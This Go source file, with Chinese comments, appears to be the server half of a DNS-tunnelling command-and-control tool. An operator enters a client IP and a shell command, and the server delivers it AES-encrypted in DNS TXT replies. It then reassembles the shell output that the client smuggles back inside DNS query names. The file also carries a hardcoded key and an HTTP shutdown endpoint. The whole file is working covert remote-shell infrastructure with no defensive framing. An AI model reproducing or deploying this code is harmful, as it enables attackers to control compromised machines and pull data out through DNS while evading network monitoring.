package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"github.com/ice-ice/dnstunnel/aes"
	"github.com/ice-ice/dnstunnel/dns"
	log "github.com/ice-ice/dnstunnel/logger"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

//uint16 最大长度65535

//===== 基础协议 ====
//dns msg id = 6偶数 时为检测服务端是否有指令需要执行 后3位为分组号例如6122

//===== shell 命令执行 =====
//dns msg id = 1 开头时为开始回传shell执行结果 后3位为分组号例如 1144 144为消息组号
//dns msg id = 3 开头时为正在回传  例如100313 后3位为分组号例如 3144 144为消息组号
//dns msg id = 5 开头时为回传shell执行结果已经完毕 后3位为分组号例如 5144 144为消息组号

var (
	SendCommandChan = make(chan []string, 1)  //数组。索引0为操作的客户端ip地址 索引1为命令   执行指令 向这个管道中通过前端输入后写入 不超过150个字符
	RequestMsgMap   = make(map[string]string) //存放发来的数据片段并且整理 key为分组号 groupid
	FmtChan         = make(chan string, 1)    //打印结果写到这个里面 读出来并且显示
	lock            sync.Mutex
	logLevel        = log.INFO //日志级别  ALL，DEBUG，INFO，WARN，ERROR，FATAL，OFF 级别由低到高

	//listenHost   = "baidu.com"        //监听域名
	//aesServerKey = "1111111111111111" //加密钥匙 务必16位
	//httpPortStr  = "8080"             //http 服务的端口号
	//serverPort   = "8053"             //udp端口

	listenHost   = "AAAAAAAAAAAAAAAA"
	aesServerKey = "1111111111111111"
	httpPortStr  = "BBBBB"
	serverPort   = "CCCCC"
	OFF          = make(chan bool, 1)
)

func main() {
	//初始化log
	//指定是否控制台打印，默认为true
	log.SetConsole(true)
	log.SetLevel(logLevel)
	log.SetRollingDaily("", "test.log")
	_, err := strconv.Atoi(httpPortStr)
	if err != nil {
		panic("httpPort must be int")
	}
	fmt.Println("[The process pid is " + strconv.Itoa(os.Getpid()) + "]")
	//开启http监听
	go func() {
		http.HandleFunc("/off", HttpOff)
		err := http.ListenAndServe(":"+httpPortStr, nil)
		if err != nil {
			log.Error("Http Server Error: ", err.Error())
		} else {
			log.Info("Http Server Success ")
		}
	}()

	//开启监听
	go func() {
		dns.HandleFunc(listenHost, HandlerServer)
		err := dns.ListenAndServe(":"+serverPort, "udp", nil)
		if err != nil {
			log.Error("DNS Server Error: ", err.Error())
			os.Exit(0)
		} else {
			log.Info("DNS Server Success ")
		}
	}()

	//每秒向管道输入心跳 防止客户端死掉
	writeCommandTimer := time.NewTicker(1 * time.Second)
	go func() {
		for _ = range writeCommandTimer.C {
			SendCommandChan <- []string{"x", ""}
		}
	}()

	go func() {
		for {
			ret := <-FmtChan
			if ret != "1" {
				//把垃圾消息过滤掉
				log.Info("RET MSG =" + ret)
			}

		}
	}()

	//等待输入
	go func() {
		waitInput()
	}()

	//优雅退出
	sigs := make(chan os.Signal, 1)
	//监听指定信号 ctrl+c kill
	signal.Notify(sigs, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)
	go func() {
		sig := <-sigs
		fmt.Println(sig)
		OFF <- true
	}()
	<-OFF
	log.Info("exit")
}

func HttpOff(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			log.Info("error - " + err.Error())
		}
		str := string(body)
		if str == aesServerKey {
			//退出
			OFF <- true
		}
	}
	w.Write([]byte("ok"))
}

func HandlerServer(w dns.ResponseWriter, req *dns.Msg) {
	addr := w.RemoteAddr()
	ip := strings.Split(addr.String(), ":")[0]
	bytes, _ := json.Marshal(req)
	log.Debug("request [" + ip + "]->" + string(bytes))
	msgId := strconv.Itoa(int(req.Id))
	commandNum := msgId[0:1]
	groupId := msgId[1:]
	log.Debug("commandNum [" + ip + "] ->" + commandNum)
	key := strings.ReplaceAll(ip, ".", "") + groupId
	log.Debug("groupId [" + ip + "]->" + key)

	var msg string
	if len(req.Question) > 0 && len(strings.Split(req.Question[0].Name, ".")) > 0 {
		msg = strings.Split(req.Question[0].Name, ".")[0]
	} else {
		msg = ""
	}

	switch commandNum {
	case "6":
		//检测执行指令
		go func() {
			strArray := <-SendCommandChan
			if strArray[0] == ip {
				//是这个客户端
				log.Debug("SendCommandChan ["+strArray[0]+"]->", strArray[1])
				//发送给客户端
				sendToClient(aesServerKey, strArray[1], w, req)
			} else if strArray[0] == "x" {
				//这个是个每秒发送的空心跳，防止客户端死掉的
				sendToClient(aesServerKey, "1", w, req)
			} else {
				//不是 则原封不动的放入管道
				go func() {
					SendCommandChan <- strArray
				}()
			}
		}()
		break
	case "1":
		lock.Lock()
		//回传shell开始
		if RequestMsgMap[key] != "" {
			//有冲突 则放弃
			log.Error("RequestMsgMap conflict [" + ip + "] groupid=" + key)
			break
		}
		RequestMsgMap[key] = msg
		lock.Unlock()
		//回应
		go func() {
			sendToClient(aesServerKey, "1", w, req)
		}()
		break
	case "3":
		//正在回传shell
		lock.Lock()
		if RequestMsgMap[key] == "" {
			//出现了数据断档，没有发送开始标志
			log.Error("RequestMsgMap break [" + ip + "] groupid=" + key)
			break
		}
		RequestMsgMap[key] += msg
		lock.Unlock()
		//回应
		go func() {
			sendToClient(aesServerKey, "1", w, req)
		}()
		break
	case "5":
		//回传shell结束
		lock.Lock()
		if RequestMsgMap[key] == "" {
			//出现了数据断档，没有发送开始标志
			log.Error("RequestMsgMap break [" + ip + "] groupid=" + key)
			break
		}
		if msg == "www" {
			//抛弃
			msg = ""
		}
		final := RequestMsgMap[key] + msg
		//解密 转编码
		b, _ := aes.AesDecrypt(final, []byte(aesServerKey))
		final = string(b)
		//清除该group
		RequestMsgMap[key] = ""
		lock.Unlock()
		//回应
		go func() {
			sendToClient(aesServerKey, "1", w, req)
		}()
		//写输出管道
		FmtChan <- final
		break
	}

}

func sendToClient(aesKey string, body string, w dns.ResponseWriter, req *dns.Msg) {
	ip := strings.Split(w.RemoteAddr().String(), ":")[0]
	m := new(dns.Msg)
	m.SetReply(req)
	m.Extra = make([]dns.RR, 1)
	str, _ := aes.AesEncrypt([]byte(body), []byte(aesKey))
	m.Extra[0] = &dns.TXT{Hdr: dns.RR_Header{Name: m.Question[0].Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0}, Txt: []string{str}}
	bytes, err := json.Marshal(m)
	if err != nil {
		log.Error(err)
	}
	log.Debug("send [" + ip + "]->" + string(bytes))
	w.WriteMsg(m)
}

func waitInput() {
	fmt.Println("=============== DNS Server===========")
	fmt.Println("")
	fmt.Println("welcome,Enter command '/up' is up list.Enter command '/e' is exits")
	input := bufio.NewScanner(os.Stdin)
	//开始
	ip := InputStart(input)
	//输入命令
	InputCommand(ip, input)
}

func InputStart(input *bufio.Scanner) string {
	fmt.Println("Enter the client ip .for example 127.0.0.1 :")
	input.Scan()
	inputIp := input.Text()

	if inputIp == "/up" {
		waitInput()
	} else if inputIp == "" {
		//回调
		return InputStart(input)
	} else if inputIp == "/e" {
		OFF <- true
		return ""
	}

	//校验ip格式
	ip := net.ParseIP(inputIp)
	if ip.To4() == nil && ip.To16() == nil {
		fmt.Println("Error ! " + inputIp + " is not a valid IPv4 or IPv16 address")
		//回调
		return InputStart(input)
	}

	return inputIp
}

//输入命令提示
func InputCommand(inputIp string, input *bufio.Scanner) {
	fmt.Println("Enter the client command .for example whoami :")
	input.Scan()
	inputCommand := input.Text()
	if len(inputCommand) > 130 {
		fmt.Println("Error! overlength ! Command maximum length is 130")
		//回调
		InputCommand(inputIp, input)
	}

	if inputCommand == "/up" {
		InputStart(input)
	} else if inputCommand == "" {
		//回调
		InputCommand(inputIp, input)
	} else if inputCommand == "/e" {
		OFF <- true
		return
	}
	fmt.Println("executing ip:" + inputIp + ",command:" + inputCommand + "")
	//询问ok
	InputOk(input)

	fmt.Println("Wait a moment to execute & return ....The delay depends on the size of the returned packet.")
	SendCommandChan <- []string{inputIp, inputCommand}
	fmt.Println("You can continue to entercommands.")
	//回调输入命令
	InputCommand(inputIp, input)
}

//y n提示
func InputOk(input *bufio.Scanner) {
	fmt.Println("Enter y or n to continue:")
	input.Scan()
	if input.Text() == "y" {

	} else if input.Text() == "n" {
		waitInput()
	} else if input.Text() == "/e" {
		OFF <- true
		return
	} else {
		InputOk(input)
	}
}
